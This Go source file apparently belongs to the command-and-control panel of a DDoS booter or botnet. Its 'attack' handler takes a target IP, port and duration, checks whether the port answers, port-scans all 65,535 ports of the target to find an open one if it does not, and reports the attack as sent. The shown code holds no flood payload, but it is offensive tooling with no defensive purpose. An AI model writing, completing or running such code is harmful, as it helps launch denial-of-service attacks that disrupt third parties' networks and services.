package attack

import (
	"fmt"
	"net"
	"server/core/master/session/sessions"
	portScan "server/core/master/utility/port"
	"strconv"
	"time"
)

func Handle(args []string, session *sessions.Session) {
	method := Get(args[0])
	if method == nil {
		session.Println("This command is not registered.")
		return
	}
	args = args[1:]

	if len(args) == 0 {
		session.Println("This usage is incorrect.")
		session.Println("Example: udp 1.1.1.1 53 30 size=1440")
		return
	}
	ip := net.ParseIP(args[0])
	if ip == nil {
		session.Println("This is not a real ip address.")
		return
	}
	args = args[1:]

	if len(args) == 0 {
		session.Println("The port was not specified.")
		return
	}
	port, err := strconv.Atoi(args[0])
	if err != nil {
		session.Println("The port is not a valid integer.")
		return
	}
	args = args[1:]

	if len(args) == 0 {
		session.Println("The duration was not specified.")
		return
	}
	_, err = strconv.Atoi(args[0])
	if err != nil {
		session.Println("The duration is not a valid integer.")
		return
	}
	if method.Type == 1 {
		_, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip.String(), port), 1*time.Second)
		if err != nil {
			session.Println(fmt.Sprintf("Port %d isn't responding, starting portscan..", port))
			ports := portScan.PortScan(0, 65535, ip.String())
			if len(ports) < 1 {
				session.Println(fmt.Sprintf("No open ports found."))
				return
			}
			port = ports[0]
		}
		session.Println(fmt.Sprintf("Port %d is vulnerable and will be used to attack", port))
	}
	session.Println(fmt.Sprintf("Attack sent to %s", ip.String()))
}
